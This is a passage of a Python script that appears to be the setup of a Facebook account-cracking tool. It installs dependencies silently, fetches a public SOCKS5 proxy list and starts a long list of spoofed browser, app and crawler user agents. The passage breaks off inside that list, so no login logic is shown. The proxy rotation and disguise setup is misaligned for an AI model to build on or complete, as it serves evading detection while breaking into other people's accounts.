import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pip install espeak')
    os.system('pkg install play-audio')
    os.system('pip install gtts')
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    os.system('clear')
    try:os.remove('.proxy.txt')
    except:pass
    uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
    open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
    sys.exit(f" [/] INTERNET CONNECTION ERROR")
XXL= open('.proxy.txt','r').read().splitlines();("espeak \"proxy add successful\"")

ugen =[
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
"Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
"MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
"Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
"Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
